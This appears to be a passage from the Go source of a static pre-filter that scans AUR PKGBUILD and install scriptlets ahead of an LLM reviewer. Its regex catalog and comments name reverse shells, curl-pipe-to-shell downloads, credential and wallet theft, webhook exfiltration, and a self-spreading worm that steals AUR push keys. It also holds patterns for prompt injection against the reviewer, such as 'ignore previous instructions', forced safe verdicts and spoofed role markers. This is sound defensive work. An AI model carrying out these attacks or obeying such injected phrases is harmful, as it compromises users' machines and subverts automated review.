// Package rules implements deterministic, offline static analysis of PKGBUILD
// and .install text. It is a fast, zero-cost pre-filter that runs before any
// model call: every hit is fed to the LLM as prior context, and the hits alone
// can also stand in for a verdict when no LLM backend is configured.
//
// The rule catalog is adapted from the patterns documented by
// KiefStudioMA/ks-aur-scanner (GPL-3.0); the codes (DLE-001, PERSIST-006, …)
// are kept compatible so findings are cross-referenceable. Regexes are
// intentionally conservative — static analysis cannot see intent, so these
// inform the LLM rather than replace it.
package rules

import (
	"regexp"
	"sort"
	"strings"
)

// Severity mirrors scan severities so findings merge cleanly.
type Severity string

const (
	Critical Severity = "critical"
	High     Severity = "warning" // maps to the auditor's "warning" tier
	Medium   Severity = "info"
	Low      Severity = "info"
)

// Rule is a single static pattern.
type Rule struct {
	Code     string
	Name     string
	Severity Severity
	re       *regexp.Regexp
}

// Hit is a matched rule with the offending line.
type Hit struct {
	Code     string
	Name     string
	Severity Severity
	File     string
	Snippet  string
}

func mk(code, name string, sev Severity, pattern string) Rule {
	return Rule{code, name, sev, regexp.MustCompile(pattern)}
}

// catalog is the built-in rule set. Patterns are case-insensitive where useful.
var catalog = []Rule{
	// --- Critical: remote code execution -----------------------------------
	// The \b after (ba)?sh is load-bearing: without it, `sh` matches the start
	// of `sha256sum`, so a checksum helper (`wget -qO - $url | sha256sum`)
	// reads as curl-pipe-bash. Both codes are in fatalCodes — non-overridable
	// — so that missing boundary made an ordinary release script permanently
	// unclearable by the model.
	mk("DLE-001", "Curl pipe to shell", Critical, `(?i)curl\s[^|]*\|\s*(ba)?sh\b`),
	mk("DLE-002", "Wget pipe to shell", Critical, `(?i)wget\s[^|]*\|\s*(ba)?sh\b`),
	mk("DLE-003", "Download then execute", Critical, `(?i)(curl|wget)\s.*-o\s*(\S+).*(chmod\s*\+x|\./)`),
	mk("PASTE-001", "Paste-site download", Critical, `(?i)(pastebin\.com|ptpb\.pw|paste\.ee|0x0\.st|transfer\.sh)`),
	// --- Critical: reverse shells -------------------------------------------
	mk("SHELL-001", "Bash reverse shell", Critical, `/dev/tcp/`),
	// SHELL-002 requires -e to execute a SHELL. `nc -vlc -p 7998 -e 'printf …;
	// cat /tmp/log.html'` is skywire-bin serving its log page over HTTP — a
	// listener running printf, not a reverse shell. The attack shape is
	// `nc host port -e /bin/sh`.
	mk("SHELL-002", "Netcat reverse shell", Critical,
		`(?i)\bn(c|cat)\b[^\n]*\s-e\s*'?"?(/bin/|/usr/bin/)?(ba|z|k|da)?sh\b`),
	mk("SHELL-003", "Python reverse shell", Critical, `(?i)socket\.socket\(|pty\.spawn`),
	mk("SHELL-004", "Socat shell", Critical, `(?i)socat\s.*exec`),
	// --- Critical: credential / secret access -------------------------------
	mk("CRED-001", "SSH key access", Critical, `(?i)(~|\$HOME|/home/[^/]+)/\.ssh\b`),
	mk("CRED-002", "GPG key access", Critical, `(?i)(~|\$HOME|/home/[^/]+)/\.gnupg\b`),
	mk("CRED-003", "Secret file access", Critical, `(?i)(/etc/shadow|\.netrc|\.aws/credentials|\.config/gh/hosts)`),
	mk("BROWSER-001", "Browser profile access", Critical, `(?i)(~|\$HOME|/home/[^/]+)/\.(mozilla|config/(google-chrome|chromium))\b`),
	mk("BROWSER-002", "Browser secret DB access", Critical, `(?i)(logins\.json|cookies\.sqlite|Login Data)`),
	// "keystore" on its own is a Java/Android/TLS term long before it is a
	// crypto one, and it matched a SIEM password tool. Qualify it.
	mk("WALLET-001", "Crypto wallet access", Critical,
		`(?i)(\.electrum|wallet\.dat|\.config/Exodus|\.ethereum/keystore|/keystore/UTC--)`),
	// --- Critical: privilege / persistence ----------------------------------
	mk("PRIV-001", "sudo/pkexec in PKGBUILD", Critical, `(?i)\b(sudo|pkexec)\s`),
	mk("PRIV-003", "sudoers modification", Critical, `(?i)/etc/sudoers`),
	// INSTALL-003 is scoped to .install files in Scan (network access in a hook
	// that runs on the user's machine is the threat). The pattern requires a
	// command-like invocation, so a bare "nc" inside C code, a licence string
	// (CC-BY-NC-SA) or base64 signature data no longer matches.
	mk("INSTALL-003", "Network in install script", Critical, `(?i)\b(curl|wget|ncat)\b|\bnc\s+-{0,2}\w`),
	// PERSIST-001 was Critical on a bare unit PATH, which made two entirely
	// ordinary things look like persistence: `install -Dm644 foo.service
	// "$pkgdir/usr/lib/systemd/system/"` is how a package SHIPS a unit, and
	// `systemctl enable foo` in a scriptlet is how it tells systemd about the
	// unit it just shipped. Neither is an attack. Writing a unit file from a
	// scriptlet IS, and PERSIST-009 covers that fatally. So this is a warning:
	// worth seeing, not worth condemning.
	mk("PERSIST-001", "systemd service enabled or unit path referenced", High,
		`(?i)(systemctl\s+(enable|start)|/etc/systemd/system/.*\.service)`),
	// PERSIST-002 requires an ACTION, not a mention. The original pattern
	// matched a bare ".timer" anywhere in any file, so a REUSE.toml listing
	// "*.timer" among its licence globs — or a README, or a .desktop — read as
	// systemd persistence. Shipping a timer unit into $pkgdir is also normal
	// packaging, so the path form is anchored on a redirection (writing a unit
	// onto the live system) rather than on the path alone.
	mk("PERSIST-002", "systemd timer enabled or written", Critical,
		`(?i)(systemctl\s+[^\n|]*\b(enable|start)\b[^\n|]*\.timer|>\s*/(etc|usr/lib|run)/systemd/system/[^\n]*\.timer)`),
	// The directive form, kept separate because it can only be judged inside a
	// scriptlet: a shipped foo.timer legitimately contains OnCalendar=, but a
	// scriptlet containing it is assembling a timer on the live system.
	mk("PERSIST-010", "systemd timer directives in an install scriptlet", High,
		`(?im)^[ \t]*(OnBootSec|OnCalendar)[ \t]*=`),
	mk("PERSIST-004", "boot script modification", Critical, `(?i)/etc/rc\.local|/etc/profile\.d/`),
	// PERSIST-006 matched ANY mention of a systemd component name, so
	// `systemd-journal-gatewayd` in a legitimate scriptlet — or in a pkgdesc —
	// read as a service masquerading as a systemd internal. The signal is a
	// package INSTALLING a unit under such a name, not naming one.
	mk("PERSIST-006", "unit file named like a systemd internal", High,
		`(?i)/(etc|usr/lib|run)/systemd/system/systemd-[a-z]+d[^/\n]*\.(service|socket|timer)`),
	// --- Critical: mining / exfil -------------------------------------------
	mk("CRYPTO-001", "Mining pool connection", Critical, `(?i)stratum\+tcp://|pool\.(minexmr|supportxmr|nanopool)`),
	mk("CRYPTO-002", "Cryptominer binary", Critical, `(?i)\b(xmrig|minerd|cpuminer|ethminer)\b`),
	mk("EXFIL-003", "Chat webhook (C2/exfil)", Critical, `(?i)(discord\.com/api/webhooks|api\.telegram\.org/bot|hooks\.slack\.com)`),
	mk("ENV-001", "LD_PRELOAD manipulation", Critical, `(?i)\bLD_PRELOAD\b`),
	// --- Critical: prompt-injection attempts against automated reviewers -----
	mk("AI-001", "Prompt-injection instruction", Critical, `(?i)\b(ignore|disregard|forget)\s+(all\s+)?(previous|prior|above|earlier)\s+(instructions|rules|messages|prompts)\b`),
	mk("AI-002", "Forced benign verdict", Critical, `(?i)\b(verdict|classification|assessment)\s*[:=]\s*["']?(OK|SAFE|CLEAN|BENIGN)["']?\b`),
	mk("AI-003", "Reviewer-directed safety claim", Critical, `(?i)\b(this\s+package\s+is\s+(safe|clean|benign)|mark\s+this\s+(package\s+)?as\s+(safe|clean|benign|ok)|tell\s+the\s+(auditor|reviewer|scanner)\s+this\s+is\s+safe)\b`),
	// AI-004 must require the PIPE form. Bare <system> is a usage placeholder
	// (`echo "sdlmess <system> <device> <software>"`) and a Flask route
	// parameter (`/api/expire/<system>/<imgtype>/`) — 4 false positives across
	// the AUR, no findings. The chat-template markers attackers actually use
	// carry the pipes: <|system|>, <|im_start|>system.
	mk("AI-004", "Role-marker prompt spoofing", Critical,
		`(?i)(<\|(system|developer|assistant|im_start|im_end)\|?>|<\|im_start\|>)`),
	mk("AI-005", "Prompt boundary spoofing", Critical, `(?i)\b(end|begin)\s+(untrusted\s+)?(package\s+)?files\b`),
	// --- Critical: the 2025/2026 AUR campaign signatures --------------------
	mk("NPM-001", "npm/bun install at build/install", Critical, `(?i)\b(npm|npx|bun|pnpm|yarn)\s+(install|add|x|run|exec)\b`),
	mk("NPM-002", "Known malicious npm payload", Critical, `(?i)\b(atomic-lockfile|lockfile-js|js-digest)\b`),
	// --- Critical: install-scriptlet worm (the xsnow-class attack) ----------
	// A .install scriptlet runs as root on the INSTALLING machine, is never
	// executed by makepkg, and is reachable from the PKGBUILD only through the
	// `install=` filename string. The family below is what that access is used
	// for: drop a Tor-fetched binary, persist it as a systemd unit, then steal
	// the victim's AUR push key and re-publish the scriptlet into every AUR
	// repo that key can reach — so each new victim's PKGBUILD looks as clean as
	// the last one's did.
	mk("EXFIL-004", "Tor onion C2 address", Critical, `(?i)\b[a-z2-7]{16,56}\.onion\b`),
	mk("EXFIL-005", "SOCKS/Tor proxy for an outbound fetch", High, `(?i)socks[45]h?://`),
	// WORM-001 tests the VERB, not the variable. `${BASH_SOURCE[0]}` is the
	// ordinary way a helper script locates itself (`cd "$(dirname
	// "${BASH_SOURCE[0]}")"`), and flagging that would make the floor noise.
	// Self-LOCATION is routine; self-COPY is a worm. Only the latter fires.
	mk("WORM-001", "Script copies itself (self-replication)", Critical,
		`(?i)\b(cp|mv|dd|tee|cat|install)\b[^\n]*\$\{?BASH_SOURCE`),
	mk("WORM-002", "AUR maintainer SSH remote used by a package script", Critical, `(?i)aur@aur\.archlinux\.org`),
	mk("WORM-003", "git push from a package script", Critical, `(?i)\bgit\s+push\b`),
	// Must not fire on a path being RESTRICTED or declared. `deny /home/*/.ssh/**
	// r,` in an AppArmor profile denies the very access this rule claims to
	// find, and dropbear's initrd hook names /root/.ssh/authorized_keys because
	// that is the feature. Requires a reading or traversing verb.
	mk("CRED-004", "root / all-user SSH directory enumeration", Critical,
		`(?i)\b(cat|cp|mv|tar|scp|rsync|find|for)\b[^\n]*(/root/\.ssh\b|/home/\*/\.ssh\b)`),
	// The worm replaces the DIRECTORY: `mv ~/.ssh ~/.ssh.orig; ln -s <other>
	// ~/.ssh`. `ln -sf "$SSH_AUTH_SOCK" ~/.ssh/ssh_auth_sock` is the standard
	// ssh-agent idiom and targets a file inside it.
	mk("CRED-005", "SSH directory moved or symlinked away", Critical,
		`(?i)\b(mv|ln)\b[^\n]*(~|\$HOME|/root)/\.ssh(\.orig|\.bak)?(\s|$)`),
	// install-only (see installOnly): these are unremarkable in a PKGBUILD
	// under fakeroot but are root-level system changes in a scriptlet.
	// PKGMGR-001 must match an INSTALL, not any pacman invocation. The old
	// pattern `(?i)pacman\s+-\S*S` matched `pacman -Qs docker` (a query),
	// `pacman --deptest` (case-insensitive S hitting the s in "deptest") and
	// `note "Use: pacman -S htop"` (where the command is `note`). 27 hits
	// across the AUR, none of them installing anything. Anchored to the command
	// position, case-sensitive, and restricted to the sync/upgrade operations —
	// pacman's operation letters are uppercase and its suboptions lowercase, so
	// -Qs and -S are cleanly distinguishable.
	mk("PKGMGR-001", "pacman install invoked from an install scriptlet", Critical,
		// -Sl (list) and -Si (info) are sync QUERIES, not installs: pacman's
		// read-only suboptions after -S are lowercase l/i/s/g/p/c, so an
		// install is bare -S, or -S followed only by y/u.
		`(?m)(^|\| )pacman\s+(-[a-z]*S[yu]*|--sync|--upgrade|-[a-z]*U)(\s|$)`),
	mk("PERSIST-007", "Remote payload written into a system binary directory", Critical,
		// /opt as a whole is not a binary directory: vllama downloads a GGUF
		// model into /opt/vllama/models/ with a sha256 check. Only bin/sbin
		// locations carry the "this will be executed" claim.
		`(?i)\b(curl|wget)\b[^\n]*\s(/usr/local/s?bin|/usr/s?bin|/opt/[^\s/]+/s?bin)/`),
	// No PERSIST-008. It fired on `chmod +x /usr/bin/<something the package
	// itself installed>` — a permission fix, common in -bin packages whose
	// upstream tarball ships wrong modes, and it hit 3 of 120 real packages
	// with hidden scriptlets. The rule conflated two different acts: in the
	// xsnow worm the chmod follows a Tor DOWNLOAD of that same path, and the
	// download is the attack. PERSIST-007 catches the download. A chmod with
	// no fetch behind it means nothing, and this code was in fatalCodes, where
	// a false positive makes a package permanently unpassable.
	mk("PERSIST-009", "install scriptlet writes a systemd unit file", Critical,
		// A drop-in — /etc/systemd/system/<unit>.service.d/override.conf — is
		// the idiomatic way to adjust a unit the package already ships, and 7
		// packages across the AUR do exactly that. The worm writes a whole new
		// unit FILE, so the target must END in .service/.socket/.timer rather
		// than continue into a .d directory.
		`(?i)>\s*/(etc|usr/lib|run)/systemd/system/[^\s/]+\.(service|socket|timer)(\s|$)`),
	// --- Critical/High: Unicode obfuscation (Trojan Source / homoglyph) ------
	// Bidirectional controls reorder how a line *displays* vs how it parses
	// (CVE-2021-42574); zero-width/BOM characters split tokens to evade regex
	// and hide content. Neither has any legitimate use in a build script, so
	// these are scanned even inside comments (see scanEvenInComments).
	mk("UNI-001", "Bidirectional control character", Critical, `[\x{202A}-\x{202E}\x{2066}-\x{2069}\x{200E}\x{200F}]`),
	// U+200C ZWNJ and U+200D ZWJ are REQUIRED orthography in Indic, Arabic,
	// Persian and Thai text: `GenericName[ml]=രേഖാദര്‍ശിനി` in a .desktop file
	// carries a ZWJ because Malayalam does not render correctly without it.
	// Flagging those was 31 false positives and zero findings. U+200B, U+2060
	// and the BOM have no such role in the middle of a file and are kept.
	// A BOM at the very start of a file is an editor artefact: it hides nothing
	// because nothing precedes it. Only a zero-width character in the MIDDLE of
	// the text can make what you read differ from what runs.
	mk("UNI-002", "Zero-width / BOM character", Critical, `(?s).[\x{200B}\x{2060}\x{FEFF}]`),
	// A punycode (xn--) host in a source URL is near-never legitimate on the AUR
	// and is a strong sign of a deliberately disguised domain.
	mk("URL-004", "Punycode (xn--) host", High, `(?i)https?://(?:[a-z0-9.\-]+\.)?xn--`),
	// Non-ASCII inside a source=() array or URL is the homoglyph signal: a host
	// that *looks* like github.com but uses e.g. a Cyrillic letter. Scoped to
	// URL/source context so legitimate UTF-8 in pkgdesc or comments is ignored.
	mk("UNI-003", "Non-ASCII character in URL/source", High, `(?i)(source=\([^)]*|https?://[^\s"')]*)[^\x00-\x7F]`),
	// --- High: obfuscation & sourcing ---------------------------------------
	mk("OBF-001", "base64 decode", High, `(?i)base64\s+(-d|--decode)`),
	mk("OBF-002", "eval of dynamic string", High, `(?i)\beval\b`),
	mk("OBF-003", "hex-encoded payload", High, `(\\x[0-9a-fA-F]{2}){4,}`),
	// CHK-005 is not a regex: it needs to pair each checksum with the source at
	// the same index. See checkChecksums in checksums.go.
	mk("URL-001", "raw IP in URL", High, `https?://\d{1,3}(\.\d{1,3}){3}`),
	// Anchored to a scheme + path so "t.co" no longer matches inside
	// "redhat.com" / "githubusercontent.com".
	mk("URL-002", "URL shortener", High, `(?i)https?://(bit\.ly|tinyurl\.com|t\.co|is\.gd|goo\.gl|ow\.ly|buff\.ly|rebrand\.ly|cutt\.ly|shorturl\.at)/`),
	mk("URL-003", "dynamic DNS host", High, `(?i)https?://[a-z0-9.\-]*(duckdns\.org|no-ip\.(com|org|biz|net)|ddns\.net|hopto\.org|zapto\.org)\b`),
	mk("HIDDEN-002", "execution from /tmp", High, `(?i)/tmp/\S+\.(sh|py|pl)\b`),
	mk("ENV-002", "PATH overwrite", High, `(?m)^\s*PATH=`),
	// --- Medium: weaker signals ---------------------------------------------
	mk("NET-001", "HTTP source URL", Medium, `(?i)source=\([^)]*http://`),
	// `curl -k` / `--insecure` / `wget --no-check-certificate` turns an https
	// URL into an unauthenticated one: the transport is encrypted, the peer is
	// whoever answers. 1panel-stable-bin downloads its binary this way and then
	// verifies it against a checksum file fetched from the same host, so an
	// attacker in that position supplies both halves. Nothing caught it.
	// Case-SENSITIVE deliberately: curl -k is --insecure, curl -K is --config.
	mk("NET-003", "TLS certificate verification disabled", High,
		`\b(curl\b[^\n|]*\s(-[a-zA-Z]*k\b|--insecure\b)|wget\b[^\n|]*--no-check-certificate\b)`),
	// SRC-001 is handled specially in Scan via the reputable-host allowlist
	// (it cannot be expressed as a single regex); see checkGitHosts.
}

// --- BLD-001 / BLD-002: build-cache confinement (issue #55) -----------------
//
// A `go` or `cargo` invocation whose caches are not confined to $srcdir writes
// outside the build directory into the invoking user's $HOME: the Go module
// cache lands in ~/go/pkg/mod (with read-only permissions unless -modcacherw)
// and cargo's registry/git caches land in ~/.cargo. That is failure by
// omission, not malice — but a scanner that promises "nothing ran yet" should
// tell the user their $HOME will be written to. Cannot be a catalog regex:
// the rule is conditional (build command present AND confinement absent), so
// it is handled specially in Scan like SRC-001.
//
// A command counts as cache-writing when the subcommand touches the module /
// registry / build caches; `go version`, `go env`, `cargo --version` etc. do
// not fire. Env-prefix assignments before the command name are permitted
// (`GOPATH="$srcdir" go build` — the prefix itself is the confinement, caught
// by the assignment scan on the raw text). The `(?:^|\|\s*)` anchor matches
// the head of each pipeline segment in the deobfuscated command view.
var (
	goWriteCmd = regexp.MustCompile(
		`(?:^|\|\s*)(?:[A-Za-z_][A-Za-z0-9_]*=[^\s|]*\s+)*go\s+(?:build|install|get|run|test|generate|mod|tool|download|vet)\b`)
	cargoWriteCmd = regexp.MustCompile(
		`(?:^|\|\s*)(?:[A-Za-z_][A-Za-z0-9_]*=[^\s|]*\s+)*cargo\s+(?:build|install|fetch|test|check|update|vendor|run|rustc|doc|bench|clippy|add)\b`)
	// Raw-text fallbacks (shell parse failed): anchored after a command
	// separator so "cargo build" cannot fire the go rule and vice versa.
	goWriteRaw = regexp.MustCompile(
		`(?m)(?:^|[;&|({]|\bthen\b|\bdo\b)[ \t]*(?:[A-Za-z_][A-Za-z0-9_]*=\S*[ \t]+)*go[ \t]+(?:build|install|get|run|test|generate|mod|tool|download|vet)\b`)
	cargoWriteRaw = regexp.MustCompile(
		`(?m)(?:^|[;&|({]|\bthen\b|\bdo\b)[ \t]*(?:[A-Za-z_][A-Za-z0-9_]*=\S*[ \t]+)*cargo[ \t]+(?:build|install|fetch|test|check|update|vendor|run|rustc|doc|bench|clippy|add)\b`)
	// Confinement: a live (non-comment) assignment/export of the confining
	// variable anywhere in the file counts — PKGBUILD functions run in the
	// same makepkg process, so an export in prepare() covers build(). For Go,
	// a vendored build (-mod=vendor) does not touch the module cache and
	// counts too. Inline prefix assignments (`GOPATH=… go build`) match here
	// as well since they appear verbatim in the raw text.
	goConfined    = regexp.MustCompile(`\b(?:GOPATH|GOMODCACHE)=|-mod=vendor\b`)
	cargoConfined = regexp.MustCompile(`\bCARGO_HOME=`)
)

// checkCacheConfinement raises BLD-001/BLD-002 when a PKGBUILD runs a
// cache-writing go/cargo command without confining GOPATH/GOMODCACHE or
// CARGO_HOME (issue #55). Informational: it feeds the LLM as context and
// tells the user the build will write into their $HOME.
func checkCacheConfinement(name, text string, cmds []cmdLine, parsed bool,
	add func(code, rname string, sev Severity, file, snippet string)) {
	type check struct {
		code, rname string
		cmdRe, raw  *regexp.Regexp
		confined    *regexp.Regexp
	}
	for _, c := range []check{
		{"BLD-001", "go build without confined GOPATH/GOMODCACHE (writes to ~/go)",
			goWriteCmd, goWriteRaw, goConfined},
		{"BLD-002", "cargo without confined CARGO_HOME (writes to ~/.cargo)",
			cargoWriteCmd, cargoWriteRaw, cargoConfined},
	} {
		if firstLiveMatch(text, c.confined, true, true) >= 0 {
			continue // caches are confined (or vendored); nothing to report
		}
		if parsed {
			// Command-position-aware view: `echo "go build …"` is data and
			// does not fire; split-token tricks are already reassembled.
			for _, cl := range cmds {
				if c.cmdRe.MatchString(cl.text) {
					add(c.code, c.rname, Medium, name, cl.text)
					break
				}
			}
			continue
		}
		if idx := firstLiveMatch(text, c.raw, true, true); idx >= 0 {
			add(c.code, c.rname, Medium, name, lineAround(text, idx))
		}
	}
}

// commentLine matches a full-line shell/INI/desktop comment. Only whole-line
// comments are stripped: inline "# ..." is NOT treated as a comment because a
// PKGBUILD URL fragment (e.g. "...nomacs.git#tag=${pkgver}") legitimately
// contains '#'.
var commentLine = regexp.MustCompile(`^[ \t]*#`)

// gitSourceHost captures the host of a VCS source URL, e.g.
// `git+https://github.com/u/r.git` -> "github.com". The capture intentionally
// accepts non-ASCII so a homoglyph host (e.g. a Cyrillic "github.com") is
// reported as-is rather than truncated; ':' and '/' are excluded so a port or
// path does not bleed into the host.
var gitSourceHost = regexp.MustCompile(`(?i)\b(?:git|svn|hg|bzr)\+https?://([^\s/:"')]+)`)

// reputableGitHosts is an allowlist of well-known forges and official
// distribution / upstream Git hosts. A VCS source on any of these is normal and
// must not be flagged by SRC-001. Extend via the user instructions file or a
// future config knob rather than editing this list in place.
var reputableGitHosts = map[string]bool{
	// major public forges. The raw/object hosts are the SAME origin as
	// github.com — a pinned raw.githubusercontent.com path is no less
	// verifiable than the repository it serves — and omitting them made
	// perfectly ordinary font and asset packages look unattributed.
	"github.com": true, "www.github.com": true,
	"raw.github.com": true, "raw.githubusercontent.com": true,
	"objects.githubusercontent.com": true, "codeload.github.com": true,
	"gitlab.com": true, "codeberg.org": true, "git.sr.ht": true,
	"bitbucket.org":   true,
	"sourceforge.net": true, "git.code.sf.net": true,
	// freedesktop / GNOME / KDE / X.Org
	"gitlab.freedesktop.org": true, "anongit.freedesktop.org": true,
	"gitlab.gnome.org": true, "invent.kde.org": true,
	"gitlab.x.org": true,
	// distributions
	"gitlab.archlinux.org": true, "aur.archlinux.org": true,
	"salsa.debian.org": true,
	"pagure.io":        true, "src.fedoraproject.org": true,
	"code.opensuse.org": true,
	"git.launchpad.net": true, "launchpad.net": true,
	// kernel / GNU / Apache / OpenStack
	"git.kernel.org":       true,
	"git.savannah.gnu.org": true, "git.savannah.nongnu.org": true,
	"savannah.gnu.org": true, "savannah.nongnu.org": true,
	"gitbox.apache.org": true, "opendev.org": true,
	// upstream project forges seen in the wild
	"git.ffmpeg.org": true, "code.launchpad.net": true,
	"git.enlightenment.org": true, "git.0pointer.net": true,
	"mirrors.ctan.org": true, "ctan.org": true,
	"git.videolan.org": true, "cgit.freedesktop.org": true,
	"repo.or.cz": true, "git.zx2c4.com": true,
}

// isReputableGitHost reports whether host is on the allowlist, including the
// per-project *.googlesource.com mirrors (android, chromium, …).
func isReputableGitHost(host string) bool {
	host = strings.ToLower(strings.TrimSuffix(host, "."))
	if reputableGitHosts[host] {
		return true
	}
	return strings.HasSuffix(host, ".googlesource.com")
}

// genericHostSuffixes are object stores, file hosts and user-content hosts where
// the bucket / path / subdomain is chosen by whoever uploads, so the host alone
// does not establish provenance: a legitimate project and an attacker sit on the
// same host, distinguished only by an attacker-choosable bucket name. A source
// on one of these is not malicious by itself, but its provenance cannot be
// inferred and must be verified out of band (SRC-002, issue #40).
var genericHostSuffixes = []string{
	"storage.googleapis.com", "amazonaws.com", "r2.dev",
	"r2.cloudflarestorage.com", "b-cdn.net", "pages.dev", "workers.dev",
	"netlify.app", "vercel.app", "surge.sh", "web.app", "firebaseapp.com",
	"blob.core.windows.net", "digitaloceanspaces.com", "aliyuncs.com",
	"backblazeb2.com", "wasabisys.com", "fastly.net", "transfer.sh",
	"temp.sh", "file.io", "gofile.io", "anonfiles.com", "mediafire.com",
	// Community asset hosts. These are NOT allowlisted, deliberately: the
	// upload path is chosen by whoever uploads, so a share link like
	// my.opendesktop.org/s/<token>/download/Theme.tar.gz establishes nothing
	// about who produced the file — the same property that puts an S3 bucket
	// in this list rather than the other one.
	"opendesktop.org", "pling.com", "store.kde.org", "kde-look.org",
	"gnome-look.org", "xfce-look.org",
}

// distributionHosts are canonical upstream distribution points and language
// package registries. SRC-003 asks "does the download host match the stated
// upstream (url=)?" — a question that is meaningless for these: a GNU project's
// homepage is never ftp.gnu.org, and a Python package's homepage is never
// files.pythonhosted.org. Flagging the mismatch says nothing about provenance
// and buries the cases where the mismatch IS the signal.
//
// This is NOT an integrity claim. A registry path is still attacker-choosable
// (typosquatting), which is a different threat handled by other rules; what the
// host establishes is that the artifact came from the ecosystem's canonical
// distribution point rather than from someone's bucket.
var distributionHosts = []string{
	// language registries
	"files.pythonhosted.org", "pypi.org", "pypi.python.org",
	"registry.npmjs.org", "registry.yarnpkg.com",
	"crates.io", "static.crates.io",
	"rubygems.org", "hackage.haskell.org", "packagist.org",
	"repo1.maven.org", "repo.maven.apache.org", "search.maven.org",
	"proxy.golang.org", "cpan.org", "metacpan.org", "pause.perl.org",
	// project / foundation distribution points
	"ftp.gnu.org", "ftpmirror.gnu.org", "download.savannah.gnu.org",
	"ftp.gnome.org", "download.gnome.org",
	"download.kde.org", "kde.org",
	"ftp.mozilla.org", "archive.mozilla.org",
	"cdn.kernel.org", "kernel.org",
	"ftp.x.org", "x.org", "xorg.freedesktop.org",
	"downloads.sourceforge.net", "downloads.xiph.org",
	"ftp.postgresql.org", "releases.llvm.org", "apache.org",
	"downloads.apache.org", "archive.apache.org",
	"ftp.debian.org", "deb.debian.org", "cdn-fastly.deb.debian.org",
	"archive.ubuntu.com", "launchpad.net",
	"sources.archlinux.org", "archlinux.org",
	"pecl.php.net", "php.net", "www.php.net",
}

// isDistributionHost reports whether host is a canonical distribution point.
func isDistributionHost(host string) bool {
	host = strings.ToLower(strings.TrimSuffix(host, "."))
	for _, d := range distributionHosts {
		if host == d || strings.HasSuffix(host, "."+d) {
			return true
		}
	}
	return false
}

func isGenericHost(host string) bool {
	host = strings.ToLower(strings.TrimSuffix(host, "."))
	for _, s := range genericHostSuffixes {
		if host == s || strings.HasSuffix(host, "."+s) {
			return true
		}
	}
	return false
}

// registrableDomain is a public-suffix-free approximation: the last two labels
// of a host (e.g. "objects.example.co" -> "example.co"). Good enough for an
// informational host-comparison signal; it is intentionally not exact for
// multi-label TLDs such as .co.uk.
func registrableDomain(host string) string {
	host = strings.ToLower(strings.TrimSuffix(host, "."))
	parts := strings.Split(host, ".")
	if len(parts) <= 2 {
		return host
	}
	return strings.Join(parts[len(parts)-2:], ".")
}

// httpSourceHost captures the host of any http(s) URL (not only VCS sources),
// so SRC-002/SRC-003 can examine binary downloads in source=() and curl/wget in
// build()/package(). Like gitSourceHost it accepts non-ASCII so a homoglyph host
// is examined as written.
var httpSourceHost = regexp.MustCompile(`(?i)\bhttps?://([^\s/:"')]+)`)

// urlField captures the host of the PKGBUILD's url= (upstream homepage) field.
var urlField = regexp.MustCompile(`(?im)^\s*url=["']?https?://([^\s/:"')]+)`)

// Scan runs the catalog over a set of files and returns hits, de-duplicated by
// (code, file). Matches that fall on a full-line comment are ignored, since a
// commented-out line is inert. SRC-001 is informational and only meaningful
// alongside other signals, so it is reported but never escalates on its own.
func Scan(files map[string]string) []Hit {
	var hits []Hit
	seen := map[string]bool{}
	add := func(code, name string, sev Severity, file, snippet string) {
		key := code + "|" + file
		if seen[key] {
			return
		}
		seen[key] = true
		hits = append(hits, Hit{Code: code, Name: name, Severity: sev, File: file, Snippet: snippet})
	}
	for name, text := range files {
		// A file the collector skipped has no content to match. It is still
		// present in the set so reference resolution can tell "in the
		// repository but not read" from "not in the repository at all".
		if IsOmitted(text) {
			continue
		}
		isPKGBUILD := name == "PKGBUILD" || strings.HasSuffix(name, "/PKGBUILD")
		isInstall := isInstallFile(name)
		// Deobfuscated command view for shell files (issue #43). Command/flag
		// rules are matched against this quote-removed, command-position-aware
		// view so split-token tricks are caught and echo-string text does not
		// false-positive. A parse failure falls back to raw-text matching.
		isShell := isPKGBUILD || isInstall || strings.HasSuffix(name, ".sh")
		var cmds []cmdLine
		parsed := false
		if isShell {
			if c, err := extractCommands(text); err == nil {
				cmds, parsed = c, true
			}
		}
		for _, r := range catalog {
			// Some rules describe root-level system changes that are normal
			// under fakeroot in a PKGBUILD but never legitimate in a scriptlet
			// that runs on the user's live system.
			if installOnly[r.Code] && !isInstall {
				continue
			}
			// Others are meaningful only in files that are actually executed,
			// not in maintainer tooling that happens to live in the repo.
			if executedOnly[r.Code] && !isExecutedFile(name) {
				continue
			}
			// And some are meaningless INSIDE a scriptlet.
			if notInInstall[r.Code] && isInstall {
				continue
			}
			// And some are meaningless outside shell content entirely.
			if shellOnly[r.Code] && !isShellFile(name) {
				continue
			}
			if commandScoped[r.Code] && parsed {
				// Match against the deobfuscated command stream. The trailing
				// space lets patterns anchored on `\s` after a command word fire
				// on a command that ends the line.
				for _, c := range cmds {
					if r.re.MatchString(c.text + " ") {
						add(r.Code, r.Name, r.Severity, name, c.text)
						break
					}
				}
				continue
			}
			// Data-literal rules (and the fallback when shell parsing failed):
			// match the raw text, skipping commented-out lines except where the
			// pattern is meaningful in comments (AI injection, bidi/zero-width).
			idx := firstLiveMatch(text, r.re,
				!scanEvenInComments(r.Code), !scanEvenInMetadata(r.Code))
			if idx < 0 {
				continue
			}
			add(r.Code, r.Name, r.Severity, name, lineAround(text, idx))
		}
		// OBF-004: token-splicing obfuscation is itself a strong malicious signal
		// — a PKGBUILD has no benign reason to disguise a command with interior
		// quotes or ANSI-C encoding. Flagged regardless of what the command is.
		for _, c := range cmds {
			if c.obf {
				add("OBF-004", "Obfuscated command (token splicing)", Critical, name, c.text)
				break
			}
		}
		// HOOK-001: an install scriptlet that backgrounds its work detaches
		// from the pacman transaction — the install reports success while the
		// payload keeps running, and (with output redirected to /dev/null)
		// prints nothing the user could notice. Legitimate scriptlets print a
		// message and return.
		if isInstall {
			for _, c := range cmds {
				if c.bg {
					add("HOOK-001", "install scriptlet detaches work into the background", High, name, c.text)
					break
				}
			}
		}
		// SRC-001: flag VCS sources on hosts that are NOT well-known forges or
		// official distribution / upstream Git hosts. Only on PKGBUILD.
		if isPKGBUILD {
			// BLD-001/BLD-002: go/cargo caches not confined to $srcdir
			// (issue #55).
			checkCacheConfinement(name, text, cmds, parsed, add)
			// CHK-005: integrity, paired positionally (checksums.go).
			checkChecksums(name, text, add)
			for _, m := range gitSourceHost.FindAllStringSubmatchIndex(text, -1) {
				start, host := m[0], text[m[2]:m[3]]
				if isCommentAt(text, start) || isReputableGitHost(host) {
					continue
				}
				add("SRC-001", "git source on uncommon host", Medium, name, lineAround(text, start))
